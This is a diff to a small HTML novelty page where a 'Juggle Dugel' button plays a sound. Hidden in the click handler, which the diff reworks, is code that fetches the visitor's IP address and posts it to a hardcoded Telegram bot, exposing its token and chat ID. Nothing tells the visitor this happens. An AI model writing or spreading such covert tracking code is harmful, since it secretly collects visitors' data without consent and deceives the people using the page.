@@ -6,60 +6,73 @@
     <title>Juggle Dugel</title>
     <style>
         body {
-            background-color: pink;
+            background-image: url("https://github.com/klwb123/Mnah-/raw/main/IMG_4969.jpeg");
+            background-size: cover; /* Ensures the image covers the entire background */
+            background-position: center; /* Centers the background image */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
+            color: white; /* Change text color to white for better visibility */
         }
         button {
             padding: 15px 30px;
             font-size: 20px;
-            background-color: #333;
+            background-color: rgba(51, 51, 51, 0.7); /* Semi-transparent background for the button */
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
         }
         button:hover {
-            background-color: #555;
+            background-color: rgba(85, 85, 85, 0.7); /* Darker shade on hover */
         }
     </style>
 </head>
 <body>
     <button id="juggleDugel">Juggle Dugel</button>
 
-    <audio id="dodoboySound" src="https://raw.githubusercontent.com/yourusername/yourrepository/main/dodoboy.mp3"></audio>
+    <audio id="dodoboySound"></audio>
 
     <script>
         const button = document.getElementById('juggleDugel');
         const audio = document.getElementById('dodoboySound');
 
+        // Set the audio source here. Using the raw link to the MP3 file from GitHub
+        audio.src = "https://github.com/klwb123/Mnah-/raw/main/dodoboy.mp3";
+
         button.addEventListener('click', async () => {
             // Play the sound
-            audio.play();
+            audio.play().catch(error => {
+                console.error("Audio playback failed:", error);
+            });
 
-            // Get user's IP and send it to Telegram
+            // Fetch user's IP address
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 const userIP = data.ip;
 
-                // Send IP to Telegram bot
+                // Send the IP address to Telegram using form data
+                const formData = new URLSearchParams();
+                formData.append('chat_id', '842463450');
+                formData.append('text', `New user IP: ${userIP}`);
+
                 await fetch(`https://api.telegram.org/bot7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM/sendMessage`, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
+                        'Content-Type': 'application/x-www-form-urlencoded',
                     },
-                    body: JSON.stringify({
-                        chat_id: 842463450,
-                        text: `New IP: ${userIP}`
-                    })
-                });
+                    body: formData.toString()
+                })
+                .then(response => response.json())
+                .then(data => console.log("Message sent to Telegram:", data))
+                .catch(error => console.error("Error sending message to Telegram:", error));
+
             } catch (error) {
-                console.error('Error:', error);
+                console.error('Error fetching IP address:', error);
             }
         });
     </script>
